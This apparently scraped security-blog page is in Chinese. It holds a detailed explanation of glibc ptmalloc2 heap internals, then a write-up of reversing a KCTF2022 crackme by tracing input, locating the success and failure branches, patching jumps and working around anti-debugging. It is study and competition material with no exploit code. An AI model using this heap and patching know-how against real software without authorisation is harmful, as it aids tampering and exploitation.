在进行分配的时候一定会根据实际选择一个最优策略，例如调用malloc(1)，我们认为分给它1字节就好了，然而现实没有那么理想。如果程序向这个1字节的内存块里面写入数据，那么我怎么判断这个只包含1字节的内存块是否正在被使用呢？这个内存块的分界线又是如何界定的呢？所以分割内存块的时候不可避免地要在内存块中额外开出一部分区域用于管理。 ptmalloc2在源码中定义了一个结构体 malloc_chunk 来描述这些内存块，所以内存块也简称 chunk。这个结构体包含了当前 chunk 的大小，前一个 chunk 的大小，前向和后向指针，以及一些标志位。当前 chunk 的大小，以及前一个 chunk 的大小，反映了当前 chunk 在堆中的位置情况，可以通过当前 chunk 地址 + 当前 chunk 的大小，得到后一个 chunk 的位置，用当前 chunk 地址 - 前一个 chunk 的大小，就可以得到前一个 chunk 的位置，这个操作，在对当前 chunk 进行 free 时会用到，因为会在 free 时根据标志位判断要被 free 的 chunk 在堆中位置前后的 chunk 是否是空闲的，如果空闲，那会先进行合并操作，再进行 free。 malloc_chunk 是用来描述内存块的，ptmalloc2 在对这些内存块进行管理时，用到了一个 bin 的概念，bin 可以翻译成一个容器，在glibc2.31版本中，bin 包括 fast bins、unsorted bin、small bin、large bin 和 tcache bin。堆管理器会根据 chunk 的类型将其放入对应的 bin 中，为了方便管理，这些 bin 都是以链表的形式存在，malloc_chunk 中包含的前向和后向指针，就是用于这里的链表管理。 分配策略ptmalloc2 会在第一次执行 malloc 的时候向操作系统申请 0x21000B（132KB），后续分配就不会向操作系统申请内存，而是会从这块132KB的堆里面进行分割小块，直到用完的时候才会再次申请内存。 接下来看具体的分配策略，首先根据申请的字节大小，系统选择一个合适的 chunksize 作为需要分配的 chunk 大小，这个 chunksize 会通过特定的宏操作计算得出，比方说，chunksize 至少为 0x20 字节，这个大小的 chunk 最多可以容纳 0x10 字节的数据，那么当申请的空间小于等于 0x10 字节时，ptmalloc2 就会分配一个大小为 0x20 字节的 chunk。这里解释下为什么 chunksize 至少为 0x20 字节，malloc_chunk 本身包含四个字段，prev_chunksize（8字节），chunksize（8字节），fwd（8字节）和 bck（8字节），其中 chunksize 描述的是整个 chunk 的大小，包含这4个字段和数据；另外，当 chunk 被使用时，fwd 和 bck 两个字段是不使用的，因为它们仅在链式管理时使用（当 chunk 放入 bin 中，也意味着这个 chunk 此时是空闲的，暂时不使用了），当 chunk 正在被使用时，这两个字段是用不到的，自然就可以用来存储数据了，也就是说，原本 malloc_chunk 结构体中两个用来存放指针的空间，可以用来存放数据，大小为 0x10 字节。 计算出需要分配多大的 chunk 以后，就会开始去不同的 bin 中查找符合条件的 chunk： 首先是 tcache bin，这是在 glibc2.26 开始引入的缓存机制，默认开启。如果申请的 chunksize 不属于 large bin，并且 tcache bin 已经初始化了，并且 tcache bin 中有对应的大小的 chunk 块，那么就会直接从 tcache bin 中取出这个 chunk 拿去用。从 tcache bin 中取出 chunk 的操作是发生在调用_int_malloc()之前的，是最先发生的操作 接下来会进入_int_malloc()，这是实现 malloc 的核心函数。进入后会先判断 chunksize 是否属于 fast bins，如果属于就去 fast bins 里面找，fast bins 的判断是严格匹配的，如果 chunksize 是 0x30 字节，那就在 fast bins 中找空闲的 0x30 字节的 chunk，不会说 0x40 字节的 chunk 好像还挺合适就拿了，不会 fast bins 没有找到合适的，则判断 chunksize 大小是否位于 small bin 的范围区间，如果符合，就会去 small bin 里面找，small bin 包含 62 条 bin 链，和 fast bins 类似，small bin 的每条 bin 链中的 chunk 大小是相同的，因此直接在对应 chunksize 的 bin 链中找就行，同样也是严格匹配 chunksize 如果在申请的 chunksize 大小位于 large bin 范围区间（或者在 fast bins 和 small bin 中未能找到合适的 chunk），则会先将 fast bins 中的 chunk 合并，插入到 unsorted bin 中，接下来遍历 unsorted bin 中的所有 chunk，同时将遍历到的 chunk 从 unsorted bin 上摘下，看这个 chunk 的大小是否符合申请的 chunksize，如果符合，就将这个 chunk 返回给用户。否则，就根据这个 chunk 的 chunksize 将其放入 small bin 或者 large bin 中。其实这一步，主要是将 unsorted bin 中的 chunk 分配到 small bin 和 large bin 中 这里还有一点很重要，在遍历 unsorted chunk 开始处有一个判断条件，会判断申请的是否为 small chunk（前面判断的 small bin 中的 chunk，这里判断是 unsorted bin 中属于 small bin 范围区间的的 chunk，即尚未分配到 small bin 中的一个 chunk），且 unsorted bin 中只有一个 chunk，且这个 chunk 为 last remainder chunk，且这个 chunk 满足所需的大小加上 0x20，如果满足这四个条件，则会尝试对这个 last remainder chunk 进行切割，参考下面（6）。切割后剩余的 chunk 仍然作为 last remainder chunk 存在 接下来，开始在 large bin 中寻找合适的 chunk，由于 large bin 的每个 bin 中的 chunk 大小是不一定相同的，所以在查找时，会先试图找到一个匹配申请的 chunksize 的 chunk。若找不到，就选择一个略微大一些的 chunk，然后判断这个 chunk 分割出 chunksize 后余下的 remainder chunk 是否能达到最小的 chunksize（即 0x20字节），如果可以达到，那就先分割，把 chunksize 的部分返回给申请的程序。余下的 remainder chunk 则链入 unsorted bin 中，当发生完这个操作后，该 remainder chunk 是最近一次被分割后得到的 chunk，因此又称作 last remainder chunk；如果 remainder chunk 达不到 0x20 字节，就不分割，把一整块返回给程序 前面提到的 small bin、unsorted bin、large bin 都属于 bins 中的一个或一组链表，下文会分析到 bins 中各个 bin 的组织结构。 如果说，在 large bin 中也没找到合适的 chunk，则会通过一个位图判断整个 bins 中是否包含符合申请 chunksize 要求的 bin 链，然后再在这个 bin 链上找是否有符合要求的 chunk，若有的话，则和 （6） 一样根据情况进行分割 如果 bins 中也没有符合要求的 chunk，则会去 top chunk 进行分割。这个 top chunk 位于一开始申请的 0x21000 字节的高地址处，它不属于任何 bin。如果 top chunk 的大小满足用户所需求的 chunk 大小，那么就会分割一块返回给申请的程序，但是余下的 remainder chunk 不会链入 unsorted bin 中，仍以 top chunk 的形式存在着 如果 top chunk 仍然不满足申请的 chunksize 需求，那么就会根据实际情况，通过sbrk()扩展 top chunk，或者调用mmap()分配新的堆 堆管理结构分配区前面提到，ptmalloc2 在实现多线程时，在 malloc 的实现中把全局用户堆（heap）划分成很多子堆（sub-heap），每一个子堆利用互斥锁使线程对于该子堆的访问互斥。这里 ptmalloc2 引入了分配区（arena）的概念，每个arena 本质上是完全不同的堆，他们独自管理自己的 chunk 和 bins。arena 分为 main_arena 和 thread_arena。malloc 内部通过brk()和mmap()系统调用来分配内存。每个进程只有一个 main_arena（称为主分配区），但是可以有多个 thread_arena（或者non_main_arena，非主分配区）。 main_arena： 对应进程 heap 段，由brk()函数创建 分配区信息由 malloc_state 结构体存储 main_arena 的 malloc_state 结构体存储在该进程链接的 libc.so 的数据段 main arena 的大小可以扩展。 thread_arena： 对应进程的 mmap 段，thread_arena 由mmap()函数创建 分配区信息由 malloc_state 和 heap_info 两个结构体存储 thread_arena 的 malloc_state 和 heap_info 存放在堆块的头部 thread_arena 的大小不可以扩展，用完之后需调用mmap()申请一个新的 thread_arena heap_infoheap_info 这个结构相当于 Heap Header，它是堆的管理结构之一。前面提到了 main_arena 和 thread_arena，其中 main_arena 是不需要 heap_info 结构体的（因为它只有一个堆），所以这里只需要关注它在 thread_arena 中的作用就行了。在非主分配区中是可能包含多个堆的，原因在于 thread_arena 中的堆是通过mmap()调用申请的，因此不能通过brk()进行扩展，当空间不足时，只能够再次调用mmap()申请新的堆空间，heap_info 就是管理这些通过mmap()申请出来的堆空间的，包括第一次申请的在内，thread_arena 申请的每个堆空间，都会对应一个 heap_info 来描述并管理这个堆 ar_ptr：这个字段指向堆所在的分配区（arena），是一个 malloc_state 结构体，一个堆只能对应一个分配区 prev：将同一个分配区（arena）中，堆的 heap_info 结构，用单向链表链接起来。这里 prev 指向链表中前一个堆对应的 heap_info size：当前堆的大小 mprotect_size：当前堆还没有被分配的内存大小 pad：用于对齐的，不用关心 malloc_statemalloc_state 相当于 Arena Header，前面提到 thread_arena 中的每个堆都对应一个 heap_info，这些所有堆共有一个 malloc_state，它用来表示分配区，位于整个分配区的头部。总结一下就是每个 thread_arena 对应一个 malloc_state，thread_arena 中的每个堆对应一个 heap_info。当然，malloc_arena 也对应一个 malloc_state，但是存储在该进程链接的 libc.so 的数据段中 mutex：用于串行化访问分配区（arena），当有多个线程访问同一个分配区时，第一个获得这个 mutex 的线程将使用该分配区分配内存，分配完成后，释放该分配区的 mutex，以便其它线程使用该分配区 flags：记录分配区的一些标志 have_fastchunks：标志位，判断 fast bin 最近是否有插入空闲块 fastbinsY：用来记录和管理 fast bin 的链表数组，每条都是单链表 top：指向 top chunk last_remainder：指向 last remainder chunk bins：包括 unsorted bin、small bin 和 large bin，具体参考下文介绍 bins 时的图，其中 NBINS 定义为 128 binmap：用于快速查找对应 index 的 bin 是否为空的一个位图 next：指向下一个 arena，arena 之间通过单循环链表构成 next_free：指向下一个空闲的 arena。这是一个链表（free_list），串着空闲的分配区（free_arena），访问这个链表上的空闲分配区，需要通过 free_list_lock 进行上锁 attached_threads：附加到当前分配区的进程数。如果该值为 0，说明没有线程附加到该分配区，此时该分配区位于 free_list。这个 free_list 就是 next_free 指向的 free_list，它包含着还没有被线程附加的空闲分配区。对于多线程的程序，某个线程申请内存时，会试图从 thread_arena 中获取到分配区，在首次申请时，thread_arena 的尚未被初始化，值为 NULL。此时会进一步调用 get_free_list() 从 free_list 中找到一个尚未被附加的 free_arena 将其返回，同时将该 arena 从 free_list 上移除，并赋值给 thread_arena。这部分在分析__libc_malloc()时会再次提到 malloc_chunkmalloc_chunk 相当于 Chunk Header，就是前面提到用来描述一个内存块的结构，chunk 在不同状态下，所使用的字段及含义也不相同，这里以定义时的结构入手进行简单的解析 mchunk_prev_size：如果前一个（虚拟内存空间的具体位置上的前一个） chunk 是空闲的，则该字段表示前一个 chunk 的大小（通过当前 chunk 的地址，以及这个字段的值，就可以定位前一个 chunk 的地址，这样在 free 当前 chunk 时，发现前一个 chunk 也是空闲时，就会发生合并）。否则，该字段用于存储前一个 chunk 的数据，没错，当前一个 chunk 不空闲时，这个字段是不属于当前 chunk 的，而是作为前一个 chunk 的存储空间使用 mchunk_size：表示当前 chunk 的大小，也记录了当前 chunk 和前一个 chunk 的一些属性 fd & bk：这俩指针仅在当前 chunk 空闲时才存在，用于将 chunk 加入到对应的 bin 中进行统一的链式管理。若当前 chunk 正在被使用，则这两个指针的位置用于存放数据 fd_nextsize & bk_nextsize：这俩指针仅在当前 chunk 空闲时，且位于 large bin 中时才存在。因为 large bin 中每条链上的 chunk 大小并不一定相同，这些大小不同的 chunk 就是用这俩指针进行链接，其中 fd_nextsize 指向 size 比自身小的里面最大的 chunk，bk_nextsize 指向 size 比自身大的里面最小的 chunk，大小相同的 chunk 则用指针 fd/bk 进行链接，这部分可以参考后面 large bin 的图示 关系 第一张图比较好看明白，即 main_arena 和 thread_arena（仅有一个堆的情况下）两个分配区中堆结构的大致情况。 这张图中的 thread_arena 包含了两个堆，此时两个堆通过 heap_info 关联，但仅有一个 malloc_state 结构，由于原先的堆空间不足了，最后的 top chunk 作为普通的 chunk 根据大小链入对应的 bin 中，新申请的堆的 top chunk 则作为新的 top chunk 存在，并由 malloc_state 中的 top 字段指向其位置。 malloc_par这里补充一个结构体，malloc_par，虽然不是最核心的堆管理结果，但是在引入 tcache 后，它会记录一些 tcache 相关的信息，并在分配时会使用到该结构，并且对于一个进程全局拥有一个唯一的 malloc_par 实例，所以这里作简要介绍： trim_threshold：top chunk 的收缩阈值 top_pad：在分配内存时是否添加额外的 pad，默认设置为0 mmap_threshold：mmap 分配阈值 arena_test：当进程的分配区数量小于等于 arena_test 时，不会重用已有的分配区 arena_max：当进程的分配区数量达到 arena_max 时，不会再创建新的分配区，只会重用已有的分配区 n_mmaps：当前进程使用 mmap() 分配的内存块的个数 n_mmaps_max & max_n_mmaps：mmap()函数分配的内存块的最大数量 no_dyn_threshold：是否开启mmap()分配阈值动态调整机制，默认为0，即开启 mmaped_mem & max_mmapped_mem：统计mmap()分配的内存大小，通常这两字段的值相等 sbrk_base：堆的起始地址 tcache_bins：tcache bin 的数量 tcache_max_bytes：最大 tcache chunk 的大小 tcache_count：每个 tcache bin 中 tcache chunk 的最大数量 Chunk一个 chunk 可以是以下几种类型之一： 已分配的（Allocated chunk） 空闲的（Free chunk） Top chunk Last Remainder chunk Allocated Chunk 这里唯一需要解释的就是 N、M、P 这三个标志位（这里能余下这 3 位是因为 chunk 大小按照 8 字节对齐）： N位：表示是否为 non_main_arena，若为1，则 chunk 属于 thread_arena M位：表示该 chunk 是否通过mmap()申请的，若为1，则是 P位：表示 prev_inuse，若位1，说明前一个（虚拟内存空间的具体位置上的前一个）块正在被使用。即处于 Allocated 状态 Free Chunk Free Chunk 多出了 fd & bk 这两个指针；若为 largin bin 中的 Free Chunk，则还会多出 fd_nextsize & bk_nextsize 这俩指针。 Top Chunk一个 arena 顶部的 chunk 被称作 top chunk，它不属于任何 bin，其信息记录在 mstate 中（即 malloc_state 结构中）。当所有 bin 中都没有空闲可用的 chunk 时，便会切割 top chunk 来满足用户的内存申请。top chunk 在进行分配时也是通过切割，若空间足够，则会从 top chunk 上切割下程序申请大小的 chunk 返回给程序，余下部分，作为新的 top chunk 存在（这个新的 top chunk，在刚分割完时也被称作 last remainder chunk，但不会链入到 unsorted bin 中）。如果连 top chunk 都不够用，则会进行如下判断： 如果位于 main_arena 中，通过brk()/sbrk()扩张 top chunk 的边界 如果位于 non_main_arena（即 thread_arena），则调用mmap()分配新的堆空间，通过 heap_info 数据结构将多个堆串连在一起 markdown1注：Top Chunk 的 PREV_INUSE 位总是1 Last Remainder ChunkLast Remainder Chunk 来源于最近一次的 split（切割） 操作。当程序申请的 mallocsize（这里用 mallocsize 表示程序申请的 chunk 大小） 落入 large bin 对应的范围区间时，若没有找到刚好合适的块，则会选择一个大于 mallocsize 的最小 chunk 进行分配。在分配该块时进行如下判断： 如果 chunksize - mallocsize >= 0x20，则分割出 mallocsize 大小的 chunk 返回给用户，余下的 chunk 将会链入 unsorted bin 中，这个余下的 chunk，就被称作 last remainder chunk，表示最近一次由于 split 操作从而进入 unsorted bin 的 chunk 如果 chunksize - mallocsize < 0x20，直接将 chunk 返回给申请的程序，此时不存在 last remainder chunk 之后当程序再次请求 small chunk 时，且 small chunk 中未能找到合适的 chunk 时，就会判断 last remainder chunk 是否为 unsorted bin 中的唯一块，如果是，那么 last remainder chunk 会被再次分割出 small chunk 返回给程序，余下的部分继续作为新的 last remainder chunk 存在。这样，当程序进行连续的小空间内存申请时，分配到的内存都是相邻的（last remainder chunk 周围） ，从而在 free 的时候就可能会与周围的空闲 small chunk 进行合并操作，达到了更好的局部性 Binbin 是用来管理 free chunk 的链表，根据功能与 chunksize 的不同，可以分为： Fast Bin Unsorted Bin Small Bin Large Bin Tcache Bin Fast Binfast bin 顾名思义，当初设计时的定位为 bins 的高速缓冲区，主要用于提高小内存分配效率，放置在 fastbinsY 数组上。当用户释放/申请一块不大于 global_max_fast 的 chunk 时，会优先考虑在 fast bin 上存放或从 fast bin 中找到是否存在合适的 chunk。它具备以下特点： fast bin 是单向链表（因为它不会从中间摘下一个 chunk 出来，添加与删除只发生在单链表的首尾之间），所以只用到了 malloc_chunk 结构的 fd 指针 fast bin 中 chunk 的 prev_inuse 位设为1，即永远被视为在使用中，这意味着相邻空闲 chunk 不会合并或被切割。它的匹配规则也是定量匹配，这在前面介绍分配策略时有提到。虽然这么做导致外部碎片增多，但是 free 效率提升 fast bin 采用先进后出（FILO）的原则，每个 bin 只存储大小相同的 chunk，最多包含 10 个，范围为 0x20 ~ 0xB0 初始化堆时会默认设置 global_max_fast 的值为 0x80，此时 fast bin 只包含 0x20 ~ 0x80 范围的 chunk，大于 0x80 的 chunk 在释放时会进入 unsorted bin。调用 mallopt 设置 fast bin 的最大值，则 fast bin 可以包含最大为 0xB0 的 chunk 结合下方示意图会更好理解 图二这里还出现了 bins，这部分在接下来的部分会介绍到 Bins首先 bins 是一个数组，数组中包含了 unsorted bin、small bin 以及 large bin，并且 bins 里面的 bin 都是双链表（使用双向链表是因为有可能会从链表的中间取出一块chunk出来返还给用户）。下面先简单了解一下 bins 中包含的这 3 种 bin，接下来结合图示，介绍 bins 的大概结构以及不同 bin 的排列 unsorted bin： 是 bins 的缓冲区，位于 bins 数组中的第一位 当用户释放的 chunk 大于 global_max_fast 或 fast bin 进行合并后得到的 chunk，都会放入 unsorted bin 中，因此，unsorted bin 中的 chunk 大小是不同的 当用户申请的 chunk 在 fast bin 与 small bin 中无法通过定量匹配找到时，会先去 unsorted bin 查找是否有合适的 chunk；若没有，则会将 unsorted bin 上的 chunk 放入 small bin 或 large bin 中，然后再去 large bin 中找 small bin： 小于 0x400 字节（64位系统）的 chunk，在从 unsorted bin 中取下时会进入 small bin 位于 bins 数组的 2~63 位，共 62 条 small bin 与 fast bin 类似，small bin 中每条 bin 存储的 chunk 也是大小相同的；不同的是它会参与合并，因此不存在两个相邻的 free chunk，small bin 采用的策略是先进先出（FIFO） small bin 中每条 bin 之间的 chunk 大小相差 0x10 字节（64位系统） small bin 起始 bin 的 chunk 大小为 0x20 字节（64位系统） large bin： 大于0x200字节（32位系统）/ 0x400 字节（64位系统）的 chunk，在从 unsorted bin 中取下时会进入 large bin。换句话说，最小的 large bin 是最大的 small bin 所不能表示的大小 位于 bins 数组的 64~126 位，共 63 条 small bin large bin 中每条 bin 上的 chunk 大小不一定相同。大小相同的 chunk 用 fd/bk 链接，不相同的用 fd_nextsize/bk_nextsize 链接 每条 bin 之间 chunk 大小相差的字节也是变化的 接下来，我们结合图示，对上述概念进行巩固： 先看第一张图，这张图只是 bins 的一个简略版，不能代表 bins 中链表结构的实际情况，但是从总体上来看是符合实际的。我们这里只需要关注粉色那一栏就行： bins 中包含了 126 个 bin，其中第 1 个是 unsorted bin，第 2—63 个是 small bin，第 64—126 个是 large bin 由图可以看出，这 126 个 bin 的开头，都对应着一对指针 fd 与 bk，这俩指针将一条 bin 双向链接起来 图中 bin1 为 unsorted bin，bin 上即存着属于 small bin 范围的 chunk，也存着属于 large bin 范围的 chunk（注意此图基于 32 位系统） 图中 bin13 位于 small bin 区间，单条 bin 上的 chunk 相同 图中 bin71 位于 large bin 区间，单条 bin 上的 chunk 不同 第二张图，看着更清晰些： 图中 BINS[1] 对应 unsorted bin，但是通过bin_at()这个宏会发现，bin_at(1) 的位置其实指向 BINS[0] 这其实是因为，尽管 bins 中的每条 bin 的开头仅需要 1 对指针即可，但是 bins 数组中的每个元素，仍然是一个 chunk 这里回顾一下 malloc_state 结构中的 bins 字段，它的类型是 mchunkptr 数组，也就是 malloc_chunk 类型，这样就可以理解为什么上图会标出来整个 malloc_chunk 结构，因为 bins 数组的每个元素就是 malloc_chunk 类型 由于 bin 头仅需要一对指针，prev_size 与 size 字段用不到，因此就可以忽略这两个字段的值，这样就可以让它们的位置与 fd/bk 的位置重叠，从而节省空间，这样，就形成了图一中，粉色那行的排布。每个 bin 的开头仅包含一对头指针 large bin 的每条 bin 上的 chunk 大小并不一定相同，对于它的整体排布可能不好理解，所以这里先根据上图来分析 large bin 的结构： 由图，这里只展示了 large bin 中的其中一个 bin（共 63 个 bin） 图中大小相同的 chunk 用同一种颜色表示，它们通过 fd & bk 指针形成一个双向循环链表。那么，对 large bin 中的任何一个 bin 来说，相同 size 的 chunk 用一条双向循环链表链接在一起 对于一个 bin 来说，其中相同 size 的 chunk 已经用双向循环链表链接在一起了，此时，这些链表中的第一个 chunk，会通过 fd_nextsize & bk_nextsize 链接在一起，即不同 size 的 chunk 也用一条双向循环链表链接在一起，其中沿着 bk_nextsize，chunksize 递增，沿着 fd_nextsize，chunksize 递减 因此 large bin 是一个二维双向链表 接下来看下这个 size 大小如何去看。这里引用了网上的一张图，链接在文末： 图中表示的是 bins 中不同 bin 对应的 size small bin 中每条 bin 上的 chunk 大小相同的，以 bin[4] 为例，在 32 位系统上，bin[4] 中每个 chunk 的大小为 32 字节，64 位则是 64 字节 对于 large bin，以 bin[64] 为例，在 32 位系统上，bin[64] 中包含的 size 范围为 [512, 576)，左闭右开的一个区间。这意味着，若从 unsorted bin 中取下的 chunk 的 size 位于这个范围区间，就会被放进 bin[64] 中。64 位系统同理。 看雪专家xi@0ji233也总结了一张表（仅针对 large bin），这里 copy 过来 Tcache BinTcache 是从 glibc2.26 开始新增的缓存机制，用于优化线程锁竞争的问题，它为每个线程预留了一组 bin，这组 bin 不属于 bins，并具备以下特点： tcache bin 中共包含 64 个 bin（定义在 TCACHE_MAX_BINS），每个 bin 中最多缓存 7 个 chunk 64 位系统上以 0x10 字节递增（24 -> 1032），32位系统上以 0x8 字节递增（12 -> 516） tcache 缓存的是非 large chunk tcache bin 上的 chunk 的 prev_inuse 设为1，不会与相邻的空闲 chunk 合并，与 fast bin 类似 当一个 chunk 被释放时，首先进入 tcache bin，而不是 fast bin，这样当该线程再次申请分配的时候，如果在其线程 tcache bin 上有空闲 chunk，就从 tcache bin 中取出，无需等待堆锁，从而实现加速分配。填满了这个大小的 tcache bin 后，再释放的 chunk 才会进入 fast bin tcache bin 由 tcache_entry 和 tcache_perthread_struct 两个结构体管理 管理 tcache 的有两个结构，分开看： tcache entry： next：位于 malloc_chunk 结构体 fd 指针的位置，指向 bin 中下一个 chunk 的地址（并非直接存储，会进行移位 & 异或，类似 AFL 定位一个基本块的手法） key：位于 malloc_chunk 结构体 bk 指针的位置（tcache bin 是单链表，未使用 bk 指针），标记 chunk 已在 tcache 中，防止针对 tcache 的 double free 攻击 tcache_perthread_struct： counts：字节数组，TCACHE_MAX_BINS（64）个元素，每个成员用来统计对应下标的 bin 中有多少个 chunk entries：指针数组，TCACHE_MAX_BINS（64）个元素，每个成员指向对应下标的 bin 的头节点，其为一个 tcache_entry 结构 结合这两张图会很好理解（第二张图来自看雪专家pukrquq） 参考链接 网安：堆内存管理 网安：glibcheap ChinaUnix：linux内存管理之malloc 看雪：malloc源码分析 看雪：how2heap深入浅出学习堆利用 CSDN：glibc Tcache机制 CSDN：堆基础—-2 开始入微数据结构 taqini：glibc调试环境的搭建 博客园：glibc2.31 malloc与free 源码分析 CSDN：ptmalloc源码分析 - 分配器状态机malloc_state（02）","categories":[],"tags":[{"name":"二进制安全","slug":"二进制安全","permalink":"http://cata1oc.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"}]},{"title":"KCTF2022春季赛第九题","slug":"KCTF2022春季赛第九题","date":"2022-06-02T11:15:40.000Z","updated":"2022-06-04T06:17:11.673Z","comments":true,"path":"2022/06/02/KCTF2022春季赛第九题/","link":"","permalink":"http://cata1oc.github.io/2022/06/02/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%B9%9D%E9%A2%98/","excerpt":"","text":"前言这是一道和第三题一样，付出了我很多心血的题目。从周六开始，一直没有思路，开始想着就这样放弃了，毕竟只有那四位做出来，但是到了周日晚上，突然打开了思路，趁着题目还有1天时间，决定周一再尝试一次，周一花了一天时间，下班时已经解出Sm4算法，回家后也找到了进行异或的位置，实际上已经分析出了全部的加密算法过程。可惜，最终败在了反调试上，周二早上一上午都没有再更进一步，遗憾没能拿分。但是这次失败，让我学习到了很多，同时也打开了一些思路，也许可以用到未来的做题或者逆向上。因此，这里把本题的做题时的思路、期间遇到的砍、最后遇到的瓶颈以及解决方案都记录一下，这也是逆向经验的一部分。希望最后两道逆向题，可以有所作为，拿到些分。 6月2日将这篇发在了看雪（花了2天才写完，5月31日中午这题结束的），同时在晚上更新到了自己的博客。6月3日一觉起来，发现这篇被设置成了精华！！！超级开心！尽管这可能是段老大看我辛苦写了这么多，给的一些激励，但我依旧非常开心，有了极大的动力！现在，此时此刻，也争取，能够在端午假期完成剩下的题目。 准备工作第一步，是令程序禁止地址随机化，这样程序每次从0x400000开始加载，而不是每次开机都会随机选择一个地址。虽然通过对IDA进行Segment的Rebase，也可以使其地址与OD/x32dbg一致（说起来，大佬们都是用x32dbg去做题，高博平时分析也是，看来以后做题时也得切换调试器了），但是用0x400000显然更好，并且也能与家里电脑分析时保持一致。具体手法如下图： 解题思路试错 首先会判断输入的字符串首字符是否为’A’，以及长度是否为32位。 如果死在前两处校验，则会打印错误；否则会打印失败 寻找触发失败流程的代码块 这一步的目标是找到，执行后打印出”失败”的函数，往往这个函数，就是对变换后的字符串进行比较的函数（比如strcmp，memcmp），确定字符串比较的位置后，再然后通过交叉引用向上溯源，就可以找到对字符串进行加密或者变换的代码了 首先是字符串识别，发现并没有找到”失败/错误”的字样。然后在main函数中继续往后找，发现在执行完函数sub_403C3B后，就会打印失败。注意sub_403C3B是不能F8步过的，因为有反调试，F8直接就跑飞了，所以在该函数后下一条指令处下断，然后F9 接着进入sub_403C3B，这是一个1000多行的函数，当然后面分析时会遇到一堆平均4000行的函数，甚至上万行无法进行F5查看伪代码的函数。我们用同样的方法定位到了sub_43A44D，该函数同样是不能F8步过，执行后打印失败，并且这又是一个1000多行的函数，这样下去就套娃了，并且会越来越难分析（我确实试图分析了几个，显然是没法达成目的的），因此这条路就走不下去 分析别的可疑代码 然后我对象发现在main函数中的两个校验之前，有一个CreateThread，通常恶意样本就会通过此方式创建线程执行恶意行为。遂跟着她这个思路走了一遍，StartAddress指向的是一个创建socket的函数，它里面又创建了一个线程，指向关闭socket的函数。同样没有什么发现 接下来就是我和大佬之间的差距了，mb_mgodlfyn文章中指出，这个关闭socket的函数里有一个sub_49C89D（他是通过对socket函数进行交叉引用+回溯找到这里的），该函数里面有一个逻辑是与0x55进行异或。虽然题目说了这里的代码确实是干扰项，但在对输入字符串进行处理时，确实有一个与0x55逐字节进行异或的操作（虽然这里的0x55异或也是干扰项），但如果很早发现这里，对解题是有一定帮助的，只能说大佬还是非常的细，这一点需要我去学习 硬件断点寻找触发点 接下来考虑硬件断点，在main函数的后方，有一处对输入的字符串进行操作，这是能看到的最后一次对输入字符串进行操作的地方，这里会将输入字符串和内置的字符串进行一个拼接，其中开头32字节对应输入字符串的ascii码，在此下硬件访问断点即可 可惜，对该字符串的操作，仅仅只是被复制1次，例如从A处复制一份到B处，所以还得在B处下断，然后发现接下来又会从B处复制一份到C处，这样无线套娃，由于硬件断点只能下4个，内存断点容易不稳定。因此，最后我干脆直接F4的，在发现这个字符串至少被复制了50次后，放弃继续跟踪下去，路又走窄了 以上的尝试，就是从周六放题开始，至周日晚上进行的所有尝试 换思路定位程序输出点 既然不能找到”失败”的字样，决定换个思路，毕竟”错误”的字样是可以找到的，只要输入的字符串长度不为32，或者第一个字符不为’A’，就会打印出”错误” 经过单步验证，输入字符串”1234”（符合首字符不为’A’的情况），会依次调用sub_415B2C、sub_499715、sub_49B4ED这3个函数，其中执行完sub_49B4ED后，可以在eax指向的地址中找到中文字符”错误”，执行完sub_49B4ED后，会在命令行中打印出”错误” 回到IDA中分析伪代码，通过观察可以发现，sub_415B2C初始化了一个数组，然后sub_499715通过对数组中特定位置字符进行异或运算，解出”错误”对应的ascii码，然后再通过sub_49B4ED打印出字符 图中两处橙色方框，都是先初始化数组，再进行异或解密，然后打印字符；但是两处初始化数组的函数不同，解密函数也不同，用于打印字符的函数是相同的。根据这个特征，我们可以去找sub_49B4ED这个函数的交叉引用，这样也许就可以找到打印”失败”所在的位置了 可以看到，在函数sub_46D092中也有三处调用sub_49B4ED的地方。进入其所在汇编附近（这里无法看伪代码，因为函数过长，超过1w行，IDA无法解析，修改解析函数大小后，又遇到了stack frame is too big的问题，查阅资料后扔无法解决，因此只能看汇编），可以看到，在每次调用sub_49B4ED之前，都有2个call，猜测这两个call是分别用来数组初始化与解密得到中文字符用的。 因此只需要在OD/x32dbg中，Patch一下，直接call到这三处打印字符函数前初始化数组的地方，然后观察命令行中打印的字符。最后可以得到有两处打印”失败”，一处打印”成功”，在上图中，已经标注出 定位影响程序输出的逻辑（字符串比较） 在找到”失败/成功”的打印处后，我们就可以向上寻找类似字符串比较的地方。由于这三处打印所在的函数非常长且畸形，无法进行反汇编，大佬都采用Ghidra进行伪代码分析，听说Ghidra对畸形代码的支持较号，但是伪代码的效果就远不如IDA了。 纯看汇编肯定不行，上万行呢！好在IDA支持CFG的形式，这里需要按照上图所示，在选项中对Graph视图进行配置，调整最大结点数，然后就能够以”基本块+边”的方式对汇编进行查看，体验会稍好些 先找到loc_47541A这个基本块，这个基本块里会打印出”失败”，我标记为”失败1”是因为，一共有2个失败，说明可能有2次判断，而这里打印”失败”的地址最靠前，说明会受到第一次判断的影响，因此被标记为”失败1”，也就先分析它 由图，可以看到，想要走到loc_47541A这个基本块，需要经过橙色方框框出来的边；如果不走到这个基本块，有两种思路，一种是走紫色方框框出来的边，另一种是红色方块框出的这条边。经过简单的验证，可以先排除红色方框的这条边，因为这条边连接着的两个基本块，范围在打印”成功”之外，所以就不在考虑范围内了。接下来考察紫色方框框出的边 这里还有一点需要说明，就是图中左右两侧的边都是直上直下连接的，也就是说左侧是从上到下几乎完全线性的基本块，不会有边从左侧的基本块连接到右侧的基本块，右侧也几乎同样如此，所以此时基本可以忽略左侧的基本块，直接看右侧上方的调用链即可 在往上查看右侧调用链时，可以发现打印”成功”的基本块，并且是在右侧。我们知道左侧的基本块会走到”失败”，现在我们要找到，导致走向失败或者成功的这个分支点在哪 再往上看，就可以找到图中所示的这片代码块了，在这里，我们看到了”失败2”所在的代码块。这里重点关注两个蓝色方框 首先是上方的蓝色方框，这里会进行跳转，如果走了红色跳转，就会进入”失败1”，因此需要避免，需要程序走到绿色的分支 其次是下面的蓝色方框（位于loc_478405），这里是一个循环，和上方的代码块loc_4783E3是关联的，IDA没有完全分析出，进入OD下断（当然先把前面的分支跳转patch掉，使之可以走到此处的代码块）可以发现，这一块是对输入的字符串进行判断，筛选出小写，即只允许输入 [0-9A-Za-z] 范围内的字符 